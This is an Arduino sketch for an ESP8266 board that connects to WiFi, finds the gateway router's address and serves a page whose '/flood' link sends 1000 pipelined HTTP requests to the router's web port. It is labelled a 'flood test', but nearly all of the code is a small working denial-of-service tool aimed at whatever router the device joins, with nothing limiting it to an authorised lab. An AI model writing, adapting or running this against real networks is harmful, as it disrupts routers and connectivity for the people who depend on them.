#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>

// Set the WiFi network credentials
const char* ssid = "your_wifi_ssid"; // Replace with your WiFi network SSID
const char* password = "your_wifi_password"; // Replace with your WiFi network password

ESP8266WebServer server(80);

void setup() {
  Serial.begin(115200);

  // Connect to the WiFi network
  WiFi.mode(WIFI_STA);
  WiFi.begin(ssid, password);
  while (WiFi.status()!= WL_CONNECTED) {
    delay(1000);
    Serial.println("Connecting to WiFi...");
  }
  Serial.println("Connected to WiFi");
  Serial.println("IP address: ");
  Serial.println(WiFi.localIP());

  // Get the IP address of the current connection's router
  IPAddress routerIP = WiFi.gatewayIP();
  char targetIP[16]; // buffer to hold the IP address as a string
  sprintf(targetIP, "%d.%d.%d.%d", routerIP[0], routerIP[1], routerIP[2], routerIP[3]);

  // Start the web server
  server.begin();

  // Define the handler for the /flood request
  server.on("/flood", HTTP_GET, [targetIP]() {
    floodRouter(targetIP);
    server.send(200, "text/plain", "Flood test started");
  });

  // Define a handler for the root URL (/) to display a simple HTML page
  server.on("/", HTTP_GET, []() {
    server.send(200, "text/html", "<h1>Router Flood Test</h1><p>Click <a href=\"/flood\">here</a> to start the flood test.</p>");
  });
}

void loop() {
  server.handleClient();
}

void floodRouter(const char* targetIP) {
  // Create a socket
  WiFiClient client;

  // Connect to the target router
  if (client.connect(targetIP, 80)) {
    Serial.println("Connected to target router");

    // Send a large number of HTTP requests to flood the router
    for (int i = 0; i < 1000; i++) {
      client.print("GET / HTTP/1.1\r\n");
      client.print("Host: ");
      client.print(targetIP);
      client.print("\r\n");
      client.print("Connection: keep-alive\r\n");
      client.print("\r\n");
    }

    Serial.println("Sent HTTP requests");
  } else {
    Serial.println("Failed to connect to target router");
  }
}